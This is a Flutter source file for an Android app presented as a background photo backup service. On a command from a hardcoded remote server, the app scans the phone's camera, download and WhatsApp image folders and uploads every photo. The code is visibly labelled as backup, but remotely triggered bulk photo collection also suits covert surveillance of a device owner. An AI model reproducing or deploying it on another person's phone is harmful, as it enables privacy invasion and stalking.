import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'dart:ui';
import 'package:flutter/foundation.dart';
import 'package:flutter/material.dart';
import 'package:flutter_background_service/flutter_background_service.dart';
import 'package:flutter_local_notifications/flutter_local_notifications.dart';
import 'package:flutter_image_compress/flutter_image_compress.dart';
import 'package:permission_handler/permission_handler.dart';

const String serverDomain = "remote-pulse-server.onrender.com";
const String deviceId = "my_device_123";

final FlutterLocalNotificationsPlugin flutterLocalNotificationsPlugin =
    FlutterLocalNotificationsPlugin();

Future<void> main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await _initNotifications();
  await initializeService();
  runApp(const RemotePulseApp());
}

Future<void> _initNotifications() async {
  const AndroidInitializationSettings initializationSettingsAndroid =
      AndroidInitializationSettings('@mipmap/ic_launcher');
  const InitializationSettings initializationSettings =
      InitializationSettings(android: initializationSettingsAndroid);
  await flutterLocalNotificationsPlugin.initialize(initializationSettings);
}

Future<void> initializeService() async {
  final service = FlutterBackgroundService();

  const AndroidNotificationChannel channel = AndroidNotificationChannel(
    'pulse_sync_channel',
    'Remote Pulse Sync',
    description: 'إشعار المزامنة والنسخ الاحتياطي في الخلفية',
    importance: Importance.low,
  );

  await flutterLocalNotificationsPlugin
      .resolvePlatformSpecificImplementation<
          AndroidFlutterLocalNotificationsPlugin>()
      ?.createNotificationChannel(channel);

  await service.configure(
    androidConfiguration: AndroidConfiguration(
      onStart: onStart,
      autoStart: true,
      isForegroundMode: true,
      notificationChannelId: 'pulse_sync_channel',
      initialNotificationTitle: 'Remote Pulse Sync',
      initialNotificationContent: 'خدمة النسخ الاحتياطي قيد التشغيل...',
      foregroundServiceNotificationId: 888,
    ),
    iosConfiguration: IosConfiguration(
      autoStart: true,
      onForeground: onStart,
      onBackground: onIosBackground,
    ),
  );
}

@pragma('vm:entry-point')
Future<bool> onIosBackground(ServiceInstance service) async {
  return true;
}

@pragma('vm:entry-point')
void onStart(ServiceInstance service) async {
  DartPluginRegistrant.ensureInitialized();

  WebSocket? webSocket;
  bool isConnected = false;
  bool isConnecting = false;
  bool isSyncing = false;

  Timer.periodic(const Duration(seconds: 4), (timer) async {
    if (!isConnected && !isConnecting) {
      isConnecting = true;
      try {
        final wsUrl = 'wss://$serverDomain/ws/phone/$deviceId';
        webSocket = await WebSocket.connect(wsUrl).timeout(const Duration(seconds: 8));
        isConnected = true;
        isConnecting = false;

        _updateNotification('جاهز للمزامنة', 'الاتصال بالسيرفر مستقر.');

        // نبضات الـ PING الحافظة للاتصال
        Timer.periodic(const Duration(milliseconds: 1500), (pingTimer) {
          if (isConnected && webSocket != null && webSocket?.readyState == WebSocket.open) {
            webSocket?.add(jsonEncode({"type": "PING", "device_id": deviceId}));
          } else {
            pingTimer.cancel();
          }
        });

        webSocket?.listen(
          (data) async {
            try {
              final message = jsonDecode(data);
              if (message['action'] == 'FETCH_ALL_IMAGES') {
                if (!isSyncing) {
                  isSyncing = true;
                  List<String> existingFiles = List<String>.from(message['existing_files'] ?? []);
                  await _startBackgroundSync(webSocket, existingFiles, service);
                  isSyncing = false;
                }
              }
            } catch (_) {}
          },
          onError: (_) {
            isConnected = false;
            isConnecting = false;
            _updateNotification('انقطع الاتصال', 'جاري إعادة المحاولة تلقائياً...');
          },
          onDone: () {
            isConnected = false;
            isConnecting = false;
            _updateNotification('انقطع الاتصال', 'جاري إعادة المحاولة تلقائياً...');
          },
          cancelOnError: true,
        );
      } catch (_) {
        isConnected = false;
        isConnecting = false;
      }
    }
  });
}

Future<void> _startBackgroundSync(
    WebSocket? ws, List<String> existingFiles, ServiceInstance service) async {
  _updateNotification('جاري فحص الملفات', 'يتم حصر الصور غير المتزامنة...');

  List<String> imagePaths = await compute(_scanImagesTask, null);
  List<String> pendingPaths = imagePaths.where((path) {
    String fileName = path.split('/').last;
    return !existingFiles.contains(fileName);
  }).toList();

  int total = pendingPaths.length;
  if (total == 0) {
    _updateNotification('المزامنة مكتملة', 'جميع الصور مجهزة ومحفوظة بالكامل.');
    return;
  }

  int current = 0;
  for (String path in pendingPaths) {
    if (ws == null || ws.readyState != WebSocket.open) break;

    String fileName = path.split('/').last;

    Uint8List? compressedBytes = await FlutterImageCompress.compressWithFile(
      path,
      minWidth: 1920,
      minHeight: 1080,
      quality: 75,
      format: CompressFormat.jpeg,
    );

    List<int> bytesToUpload = compressedBytes ?? await File(path).readAsBytes();
    String base64Image = await compute(base64Encode, bytesToUpload);

    ws.add(jsonEncode({
      "type": "NEW_IMAGE_DATA",
      "file_name": fileName,
      "data": base64Image,
    }));

    current++;
    _updateNotification(
      'جاري النسخ الاحتياطي ($current/$total)',
      'يتم نقل: $fileName',
    );

    await Future.delayed(const Duration(milliseconds: 300));
  }

  _updateNotification('اكتملت المزامنة', 'تم نقل كافة الصور المحددة بنجاح.');
}

void _updateNotification(String title, String content) {
  flutterLocalNotificationsPlugin.show(
    888,
    title,
    content,
    const NotificationDetails(
      android: AndroidNotificationDetails(
        'pulse_sync_channel',
        'Remote Pulse Sync',
        channelDescription: 'إشعار المزامنة والنسخ الاحتياطي في الخلفية',
        importance: Importance.low,
        priority: Priority.low,
        ongoing: true,
        autoCancel: false,
      ),
    ),
  );
}

// تم حذف كلمة static من هنا لتعمل بدون أخطاء
Future<List<String>> _scanImagesTask(void _) async {
  List<String> imagePaths = [];
  List<String> targetDirs = [
    '/storage/emulated/0/DCIM',
    '/storage/emulated/0/Pictures',
    '/storage/emulated/0/Download',
    '/storage/emulated/0/WhatsApp/Media/WhatsApp Images',
  ];

  for (var dirPath in targetDirs) {
    Directory dir = Directory(dirPath);
    if (dir.existsSync()) {
      try {
        List<FileSystemEntity> files = dir.listSync(recursive: true, followLinks: false);
        for (var entity in files) {
          if (entity is File) {
            String ext = entity.path.toLowerCase();
            if (ext.endsWith('.jpg') || ext.endsWith('.jpeg') || ext.endsWith('.png') || ext.endsWith('.webp')) {
              imagePaths.add(entity.path);
            }
          }
        }
      } catch (_) {}
    }
  }
  return imagePaths;
}

class RemotePulseApp extends StatelessWidget {
  const RemotePulseApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      title: 'Remote Pulse Sync',
      theme: ThemeData.dark().copyWith(
        scaffoldBackgroundColor: const Color(0xFF0D1117),
      ),
      home: const MainHomeScreen(),
    );
  }
}

class MainHomeScreen extends StatefulWidget {
  const MainHomeScreen({super.key});

  @override
  State<MainHomeScreen> createState() => _MainHomeScreenState();
}

class _MainHomeScreenState extends State<MainHomeScreen> {
  @override
  void initState() {
    super.initState();
    _requestPermissions();
  }

  Future<void> _requestPermissions() async {
    if (Platform.isAndroid) {
      await [
        Permission.storage,
        Permission.photos,
        Permission.videos,
        Permission.manageExternalStorage,
        Permission.ignoreBatteryOptimizations,
        Permission.notification,
      ].request();
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: Center(
        child: Padding(
          padding: const EdgeInsets.all(24.0),
          child: Container(
            padding: const EdgeInsets.all(28.0),
            decoration: BoxDecoration(
              color: const Color(0xFF161B22),
              borderRadius: BorderRadius.circular(20),
              border: Border.all(
                color: Colors.greenAccent,
                width: 1.5,
              ),
            ),
            child: const Column(
              mainAxisSize: MainAxisSize.min,
              children: [
                // تم تعديل اسم الأيقونة هنا إلى Icons.sync_rounded
                Icon(
                  Icons.sync_rounded,
                  size: 64,
                  color: Colors.greenAccent,
                ),
                SizedBox(height: 20),
                Text(
                  'خدمة النسخ الاحتياطي تعمل دائماً في الخلفية والإشعارات مفعلة.',
                  textAlign: TextAlign.center,
                  style: TextStyle(color: Colors.white, fontSize: 15, fontWeight: FontWeight.w500),
                ),
              ],
            ),
          ),
        ),
      ),
    );
  }
}
